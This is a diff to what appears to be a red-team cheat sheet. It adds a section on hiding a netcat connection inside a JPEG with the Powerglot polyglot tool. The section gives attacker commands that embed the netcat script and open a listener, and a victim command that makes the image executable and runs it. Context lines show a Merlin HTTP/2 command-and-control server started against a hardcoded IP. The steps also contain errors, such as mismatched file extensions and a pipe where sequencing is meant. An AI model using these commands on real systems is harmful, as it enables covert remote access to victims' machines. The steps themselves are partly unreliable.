@@ -33,6 +33,21 @@ End Sub
 
 * VirusTotal report of the artifact generated: https://www.virustotal.com/gui/file/2ee890676fdaf5daf128cd0637f2f86cbe01d8db3bef23c9ee897c841d549095/details
 
+## Polyglot Payloads
+
+* Powerglot: https://github.com/mindcrypt/powerglot
+
+* **Hiding a cover-channel wiht netcat in a JPEG image**
+
+* Attacker
+`echo "nc 127.0.0.1 4444" > netcat.sh`
+`python3 powerglot.py -o netcat.sh cat.jpeg cat-netcat.jpeg`
+`nc -nvlp 4444`
+
+* Victim
+`chmod +x cat-netcat.jpg | ./cat-netcat.jpg`
+
+
 ## Post-Exploitation over HTTP/2 C&C
 
 * `./ merlinServer-Linux-x64 -i 46.101.222.52`
